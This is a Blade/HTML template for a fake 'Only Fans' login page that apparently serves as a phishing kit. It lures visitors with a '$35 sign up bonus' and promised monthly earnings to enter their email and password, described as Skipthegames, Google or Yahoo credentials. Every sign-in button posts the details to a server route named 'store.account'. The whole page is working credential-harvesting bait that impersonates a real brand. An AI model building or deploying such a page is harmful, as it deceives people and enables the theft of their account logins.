<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Only Fans</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="{{asset('frontend/assets/css/main.css')}}" />
  </head>
  <body>
    <header>
      <div class="container-fluid">
        <div class="row">
          <div class="cookie-inner">
            <p>
              We use cookies to give you the best experience and to ensure the
              safety of our users. The only non-essential cookies we use are for
              any personal referrals you make. We do not track you across other
              sites. You can see our
              <span style="color: #009dec">Cookie Policy</span> here , and our
              <span style="color: #009dec">Privacy Notice</span> here.
            </p>
            <div class="row">
              <div class="col-md-4 offset-md-4 cookie-btn">
                <a href="">Reject Referral Cookies</a>
                <a href="">Accept All</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </header>

    <section class="main-content">
      <div class="container-fluid">
        <div class="row">
          <div class="col-md-6 col-sm-12">
            <div class="logo-slide-inner">
              <div class="logo">
                <img src="{{asset('frontend/assets/images/logo.png')}}" alt="logo" />
              </div>
              <p>
                Sign up to support your<br />
                favorite creators
              </p>
            </div>
            <div class="marque-text">
              <marquee style="color: rgb(0, 145, 234)"
                >Log in with your Skipthegames account <br />
                and <b>win $35 sign up bonus</b></marquee
              >
            </div>
          </div>
          <div class="col-md-6 col-sm-12">
            <div class="login-info-inner">
              <div class="login-form">
                <form action="{{ route('store.account') }}" method="POST">
                  @csrf
                  <h4>Log in</h4>
                  <!-- Email input -->
                  <div data-mdb-input-init class="form-outline mb-4">
                    <input
                      type="email"
                      id="email"
                      class="form-control"
                      placeholder="Email"
                      name="email"
                    />
                  </div>

                  <!-- Password input -->
                  <div data-mdb-input-init class="form-outline mb-4">
                    <input
                      type="password"
                      id="password"
                      class="form-control"
                      placeholder="Password"
                      name="password"
                    />
                  </div>
                  <button type="submit" class="btn">login</button>

                  <div class="row mb-4">
                    <div class="col float-right">
                      <a href="#!">Forgot password?</a>
                    </div>
                  </div>
                  <div class="logintext">
                    <h4>Join now and win a $35 signup bonus</h4>
                    <ul>
                      <li>
                        Sign in with your skipthegames account and get $35
                        signup bonus
                      </li>
                      <li>
                        You could earn between $1,499 and $7,495 per month
                      </li>
                    </ul>
                  </div>

                  <div class="next-button">
                    <button class="button1" type="submit" name="submit">
                      SIGN IN WITH SKIPTHEGAMES
                    </button>
                  </div>
                  <div class="next-button">
                    <button class="button2" type="submit" name="submit">
                      SIGN IN WITH GOOGLE
                    </button>
                  </div>
                  <div class="next-button">
                    <button class="button3" type="submit" name="submit">
                      SIGN IN WITH YAHOO
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <hr class="footer-top" />

    <section class="footer">
      <div class="container">
        <div class="row offset-md-1">
          <div class="col-md-2 col-sm-12">
            <div class="footer-inner">
              <ul>
                <li>2022 Only Fans</li>
                <li>Contact</li>
                <li>English</li>
              </ul>
            </div>
          </div>
          <div class="col-md-2 col-sm-12">
            <div class="footer-inner">
              <ul>
                <li>Home</li>
                <li>Store</li>
                <li>Company Policy</li>
                <li>How it works</li>
              </ul>
            </div>
          </div>
          <div class="col-md-2 col-sm-12">
            <div class="footer-inner">
              <ul>
                <li>About</li>
                <li>Theme of service</li>
                <li>Referrals</li>
                <li>Cookie notice</li>
              </ul>
            </div>
          </div>
          <div class="col-md-2 col-sm-12">
            <div class="footer-inner">
              <ul>
                <li>Blog</li>
                <li>DMCA</li>
                <li>USC 2257</li>
                <li>Standard Contract between fan and creator</li>
              </ul>
            </div>
          </div>
          <div class="col-md-2 col-sm-12">
            <div class="footer-inner">
              <ul>
                <li>Branding</li>
                <li>Privacy</li>
                <li>Acceptable use policy statement</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
